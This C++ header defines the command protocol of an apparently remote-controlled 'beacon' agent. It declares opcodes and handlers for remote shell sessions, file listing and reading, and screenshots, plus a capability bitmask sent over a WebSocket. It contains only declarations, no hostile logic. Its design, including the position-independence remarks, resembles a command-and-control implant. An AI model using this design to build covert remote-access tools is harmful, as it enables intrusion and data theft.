#pragma once

#include "primitives.h"
#include "shell.h"
#include "screen_capture.h"

// Enum to represent the different command types that can be handled by the agent.
// Values are wire opcodes — shell commands first, then FileSystem, then Display,
// Exit last.
enum CommandType : UINT8
{
    Command_OpenShell = 1,
    Command_WriteShell = 2,
    Command_ReadShell = 3,
    Command_CloseShell = 4,
    Command_GetDirectoryContent = 5,
    Command_GetFileContent = 6,
    Command_GetFileChunkHash = 7,
    Command_GetDisplays = 8,
    Command_GetScreenshot = 9,
    Command_Exit = 10,
    CommandTypeCount
};

// =============================================================================
// Compile-time capability flags
//
// Each FEATURE CATEGORY has a SUPPORT_<CATEGORY> macro (default 1). Override to
// 0 per-platform/build (e.g. via a toolchain compile definition) to compile a
// whole category out: every command it owns is then unregistered in the
// dispatch table (main.cc) and its bit is cleared in the identity capability
// mask header. These macros are the single source of truth for which feature
// categories this beacon supports — the dispatch wiring and BuildCapabilityMask()
// both derive from them. Exit is a mandatory core command and is always
// registered; it is not feature-gated and not advertised in the mask.
//
// Category -> owned commands:
//   SHELL       OpenShell, WriteShell, ReadShell, CloseShell
//   FILESYSTEM  GetDirectoryContent, GetFileContent, GetFileChunkHash
//   DISPLAY     GetDisplays, GetScreenshot
// =============================================================================
#ifndef SUPPORT_FILESYSTEM
#define SUPPORT_FILESYSTEM 1
#endif
#ifndef SUPPORT_SHELL
#define SUPPORT_SHELL 1
#endif
#ifndef SUPPORT_DISPLAY
#define SUPPORT_DISPLAY 1
#endif

#ifndef AGENT_BUILD_NUMBER
#define AGENT_BUILD_NUMBER 0
#endif
#ifndef AGENT_COMMIT_HASH
#define AGENT_COMMIT_HASH "00000000"
#endif
// v2: WireDirectoryEntry gained UINT64 VolumeSerial (appended; array stride changed)
#ifndef AGENT_API_VERSION
#define AGENT_API_VERSION 1
#endif
#ifndef AGENT_NAME_ID
#define AGENT_NAME_ID 0
#endif

// NOTE: build metadata (ApiVersion, AgentNameId, CommitHash, BuildNumber)
// is no longer a wire struct — it travels on the WebSocket upgrade request
// as identity HTTP headers (X-Api-Version et al.), built in main.cc
// (BuildIdentityHeaders).

/**
 * @brief Feature categories advertised in the identity capability mask header.
 *
 * @details Each category's bit position in CapabilityMask equals its value
 *          here. Exit is a mandatory core command and is intentionally NOT
 *          represented (always available, never gated).
 */
enum CapabilityBit : UINT8
{
    Capability_Shell = 0,      ///< Interactive shell (open/write/read/close)
    Capability_FileSystem = 1, ///< File system access (dir listing, file read, chunk hash)
    Capability_Display = 2,    ///< Display enumeration + screenshot
    CapabilityBitCount
};

/**
 * @brief 64-bit feature-category capability mask (sent as the X-Client-Features
 *        hex header on the WebSocket upgrade).
 *
 * @details Bit i (byte i/8, bit i%8, LSB-first) is set iff feature category i
 *          is supported. Bits [CapabilityBitCount .. 63] are reserved (0).
 *          Read bit i as (Bits[i/8] >> (i%8)) & 1.
 */
static constexpr USIZE CAPABILITY_MASK_BYTES = 8; ///< CapabilityMask size in bytes (64 bits)

#pragma pack(push, 1)
struct CapabilityMask
{
    UINT8 Bits[CAPABILITY_MASK_BYTES]; ///< Raw category bitmask, LSB-first per byte
};
#pragma pack(pop)

static_assert(CapabilityBitCount <= CAPABILITY_MASK_BYTES * 8, "CapabilityMask too small for categories");
static_assert(sizeof(CapabilityMask) == 8, "CapabilityMask must stay 8 bytes on the wire");

/**
 * @brief Builds the capability mask at compile time from the SUPPORT_* macros.
 *
 * @details Each category bit mirrors its SUPPORT_<CATEGORY> macro; the bit
 *          position equals the CapabilityBit value.
 *
 * @return Compile-time-constant CapabilityMask serialized into the
 *         X-Client-Features header (lowercase hex).
 */
inline constexpr CapabilityMask BuildCapabilityMask() noexcept
{
    CapabilityMask mask = {};
    auto set = [&mask](CapabilityBit bit, int supported)
    {
        if (supported)
        {
            USIZE b = static_cast<USIZE>(bit);
            mask.Bits[b / 8] |= static_cast<UINT8>(1u << (b % 8));
        }
    };
    set(Capability_Shell, SUPPORT_SHELL);
    set(Capability_FileSystem, SUPPORT_FILESYSTEM);
    set(Capability_Display, SUPPORT_DISPLAY);
    return mask;
}

// Status codes for command handling results
enum StatusCode : UINT32
{
    StatusSuccess = 0,
    StatusError = 1,
    StatusUnknownCommand = 2
};

// Context structure to hold state information for command handlers, such as shell and screen capture context instances
struct Context
{
    ShellManager shellManager;
    ScreenCaptureContext *screenCaptureContext = nullptr;
    // Set by Handle_ExitCommand; read by the main loop so it can send the ACK
    // and then tear down. Lives on the stack (no data section) to stay PIC-safe.
    BOOL shouldExit = false;

    ~Context()
    {
        // shellManager destroys its own shells.
        if (this->screenCaptureContext != nullptr)
        {
            delete this->screenCaptureContext;
            this->screenCaptureContext = nullptr; // Good practice to avoid double-free
        }
    }
};

// Type definition for command handler function pointers
using CommandHandler = VOID (*)(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);

// Command handler function declarations
VOID Handle_GetDirectoryContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetFileContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetFileChunkHashCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_ReadShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_WriteShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_OpenShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_CloseShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetDisplaysCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetScreenshotCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_ExitCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);